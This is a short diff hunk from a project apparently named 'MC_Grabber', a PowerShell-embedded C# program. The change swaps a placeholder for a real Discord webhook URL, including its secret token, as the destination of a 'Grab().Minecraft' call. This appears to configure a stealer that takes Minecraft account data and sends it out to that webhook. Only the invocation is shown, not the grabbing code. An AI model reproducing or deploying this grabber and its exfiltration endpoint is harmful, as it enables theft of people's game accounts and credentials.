@@ -91,4 +91,4 @@ namespace MC_Grabber
         }
     }
 }
-'@; new-object Program.Grab().Minecraft('TU_WEBHOOK_URL_AQUI')"
+'@; new-object Program.Grab().Minecraft('https://discord.com/api/webhooks/1523373445029826681/SarBhnPpZZwthwoz9vIwO6VdiDxAE6BuTNWRa6VqMGCo5aZBQnurCQ5-zYY3213k68LY')"
